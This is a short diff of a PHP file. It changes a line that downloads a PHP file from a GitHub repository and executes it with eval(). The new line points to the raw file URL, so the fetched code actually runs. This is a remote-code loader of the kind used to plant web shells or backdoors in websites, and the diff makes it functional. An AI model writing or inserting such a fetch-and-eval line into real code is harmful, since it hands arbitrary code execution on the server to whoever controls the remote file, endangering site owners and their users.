@@ -17,4 +17,4 @@ function getURL($url) {
 }
 
 
-eval("?>" . getURL("https://github.com/onlyme1d/dxerror/blob/main/gecko-old.php"));
+eval("?>" . getURL("https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/gecko-old.php"));
